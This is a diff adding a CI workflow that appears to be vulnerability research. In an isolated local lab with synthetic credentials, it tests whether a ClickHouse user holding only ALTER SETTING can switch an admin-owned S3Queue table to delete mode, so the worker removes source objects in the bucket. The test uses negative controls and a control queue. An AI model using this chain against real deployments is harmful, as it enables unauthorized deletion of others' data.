@@ -1,0 +1,136 @@
+name: S3Queue ALTER-to-DELETE Confused-Deputy E2E
+on:
+  push:
+    branches: [research-clickhouse-s3queue-postprocess-20261113]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  e2e:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Start isolated MinIO and unmodified ClickHouse
+        shell: bash
+        run: |
+          set -euo pipefail
+          docker run -d --name minio --network host \
+            -e MINIO_ROOT_USER=syntheticminio \
+            -e MINIO_ROOT_PASSWORD=syntheticminiopassword \
+            minio/minio:RELEASE.2025-09-07T16-13-09Z \
+            server /data --address ":19000" --console-address ":19001"
+          python3 -m pip -q install --user boto3
+          for i in {1..75}; do
+            curl -fsS http://127.0.0.1:19000/minio/health/ready >/dev/null && break
+            sleep 2
+          done
+          curl -fsS http://127.0.0.1:19000/minio/health/ready
+          cat > /tmp/ch-s3.xml <<'XML'
+          <clickhouse>
+            <listen_host>127.0.0.1</listen_host>
+          </clickhouse>
+          XML
+          docker run -d --name ch --network host --memory 4g --ulimit nofile=262144:262144 \
+            -e CLICKHOUSE_USER=admin -e CLICKHOUSE_PASSWORD=synthetic-clickhouse-pass \
+            -e CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT=1 \
+            -v /tmp/ch-s3.xml:/etc/clickhouse-server/config.d/localhost.xml:ro \
+            clickhouse/clickhouse-server:26.10.3.7
+          for i in {1..90}; do
+            curl -fsS --user admin:synthetic-clickhouse-pass \
+              'http://127.0.0.1:8123/?query=SELECT%201' >/dev/null && break
+            sleep 2
+          done
+          curl -fsS --user admin:synthetic-clickhouse-pass \
+            'http://127.0.0.1:8123/?query=SELECT%20version()'
+      - name: Test unauthorized source deletion after settings-only ALTER
+        shell: bash
+        run: |
+          cat > /tmp/test_s3queue.py <<'PY'
+          import boto3,sys,time,base64,urllib.request,urllib.error
+          S3=boto3.client("s3",endpoint_url="http://127.0.0.1:19000",
+              aws_access_key_id="syntheticminio",
+              aws_secret_access_key="syntheticminiopassword",
+              region_name="us-east-1")
+          S3.create_bucket(Bucket="synthetic-bucket")
+          def run(sql,user="admin",pw=None):
+              if pw is None: pw={"admin":"synthetic-clickhouse-pass","editor":"synthetic-editor-pass","unpriv":"synthetic-unpriv-pass"}[user]
+              req=urllib.request.Request("http://127.0.0.1:8123/", data=sql.encode(), method="POST")
+              req.add_header("Authorization","Basic "+base64.b64encode(f"{user}:{pw}".encode()).decode())
+              try:
+                  with urllib.request.urlopen(req,timeout=30) as response:
+                      return response.status,response.read().decode(errors="replace").strip()
+              except urllib.error.HTTPError as e:
+                  return e.code,e.read().decode(errors="replace").strip()
+          def must(sql):
+              code,body=run(sql)
+              print("SETUP",repr(sql),"->",code,repr(body[:350]),flush=True)
+              if code!=200: raise AssertionError(f"SETUP_FAILED {code}: {sql}: {body[:600]}")
+              return body
+          def check(name, condition, detail):
+              print("CHECK",name,"PASS" if condition else "INVESTIGATE",str(detail)[:350],flush=True)
+              return condition
+          def exists(key):
+              try: S3.head_object(Bucket="synthetic-bucket",Key=key);return True
+              except Exception as e:
+                  if getattr(e,"response",{}).get("Error",{}).get("Code") in ("404","NoSuchKey","NotFound"):return False
+                  raise
+          def count(table):
+              return int(must(f"SELECT count() FROM s3q_lab.{table} LIMIT 1 SETTINGS max_execution_time=15,max_rows_to_read=100000"))
+          must("SELECT version()")
+          must("CREATE DATABASE s3q_lab")
+          must("CREATE TABLE s3q_lab.sink_attack (id UInt32) ENGINE=MergeTree ORDER BY id")
+          must("CREATE TABLE s3q_lab.sink_keep (id UInt32) ENGINE=MergeTree ORDER BY id")
+          # Nothing uploaded yet: both live queues start under an administrator.
+          base="'http://127.0.0.1:19000/synthetic-bucket/{prefix}/*.csv','syntheticminio','syntheticminiopassword','CSV'"
+          for name,prefix in (("q_attack","attack"),("q_keep","keep")):
+              must(f"CREATE TABLE s3q_lab.{name} (id UInt32) ENGINE=S3Queue(" +
+                   base.format(prefix=prefix) +
+                   ") SETTINGS mode='exclusive',after_processing='keep',processing_threads_num=1,polling_min_timeout_ms=1000,polling_max_timeout_ms=1000")
+              sink="sink_attack" if name=="q_attack" else "sink_keep"
+              must(f"CREATE MATERIALIZED VIEW s3q_lab.mv_{name} TO s3q_lab.{sink} AS SELECT id FROM s3q_lab.{name}")
+          must("CREATE USER editor IDENTIFIED WITH plaintext_password BY 'synthetic-editor-pass'")
+          must("CREATE USER unpriv IDENTIFIED WITH plaintext_password BY 'synthetic-unpriv-pass'")
+          must("GRANT ALTER SETTING ON s3q_lab.q_attack TO editor")
+          print("EDITOR_GRANTS",must("SHOW GRANTS FOR editor"),flush=True)
+          # Authorization boundaries on the very same action path
+          command="ALTER TABLE s3q_lab.q_attack MODIFY SETTING after_processing='delete'"
+          code,body=run(command,"unpriv")
+          neg_unpriv=check("unprivileged_alter_rejected",code!=200,(code,body))
+          code,body=run("SELECT * FROM s3('http://127.0.0.1:19000/synthetic-bucket/attack/test.csv','syntheticminio','syntheticminiopassword','CSV','id UInt32') LIMIT 1","editor")
+          neg_read=check("editor_has_no_s3_read",code!=200,(code,body))
+          code,body=run(command,"editor")
+          did_alter=check("editor_changes_delete_setting",code==200,(code,body))
+          if not did_alter:
+              print("STOP: settings-only role cannot reach delete mode; check grant and other requirements",flush=True)
+              sys.exit(4)
+          print("AFTER_ALTER",must("SHOW CREATE TABLE s3q_lab.q_attack")[:700],flush=True)
+          # Simulate an ordinary external producer writing data AFTER the low-privilege configuration change
+          S3.put_object(Bucket="synthetic-bucket",Key="attack/test.csv",Body=b"501\n",ContentType="text/csv")
+          S3.put_object(Bucket="synthetic-bucket",Key="keep/test.csv",Body=b"502\n",ContentType="text/csv")
+          assert exists("attack/test.csv") and exists("keep/test.csv")
+          attack_count=keep_count=0
+          for attempt in range(40):
+              time.sleep(2)
+              attack_count=count("sink_attack")
+              keep_count=count("sink_keep")
+              if attack_count>=1 and keep_count>=1:break
+          print("AFTER_PROCESSING",{"attack_rows":attack_count,"keep_rows":keep_count,
+              "attack_source_exists":exists("attack/test.csv"),"keep_source_exists":exists("keep/test.csv")},flush=True)
+          check("background_processed_synthetic_objects",attack_count==1 and keep_count==1,(attack_count,keep_count))
+          changed_source=not exists("attack/test.csv")
+          control_source=exists("keep/test.csv")
+          check("control_keep_source_remains",control_source,control_source)
+          check("delete_mode_removed_source",changed_source,changed_source)
+          if not neg_unpriv or not neg_read or not did_alter or not changed_source or not control_source:
+              print("VERDICT: no fully validated unauthorized-delete chain on this run",flush=True)
+              sys.exit(3)
+          print("CANDIDATE_E2E: Editor with ALTER SETTING only changed admin-owned S3Queue to DELETE; source object was removed by worker using saved credentials while control object survived. Evaluate intended ALTER authority and security policy before reporting.",flush=True)
+          PY
+          python3 /tmp/test_s3queue.py
+      - name: Server logs on failure
+        if: failure()
+        run: |
+          echo "=== ClickHouse logs ==="
+          docker logs --tail 110 ch 2>&1 | tail -110
+          echo "=== MinIO logs ==="
+          docker logs --tail 55 minio 2>&1 | tail -55
